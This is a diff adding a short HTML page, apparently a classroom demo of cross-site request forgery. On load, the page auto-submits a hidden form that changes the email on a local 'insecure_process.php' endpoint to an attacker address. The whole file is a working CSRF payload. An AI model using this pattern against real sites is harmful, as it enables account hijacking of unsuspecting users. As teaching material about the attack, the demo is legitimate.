@@ -1,0 +1,14 @@
+<!doctype html>
+<html>
+<head><meta charset="UTF-8"><title>CSRF Attack Demo</title></head>
+<body>
+<h1>Attacker Page</h1>
+<form action="http://localhost/project/insecure_process.php" method="POST" id="attackForm">
+  <input type="hidden" name="email" value="hacker@example.com">
+</form>
+<script>
+  // โหลดหน้านี้แล้วส่งฟอร์มอัตโนมัติ
+  document.getElementById('attackForm').submit();
+</script>
+</body>
+</html>
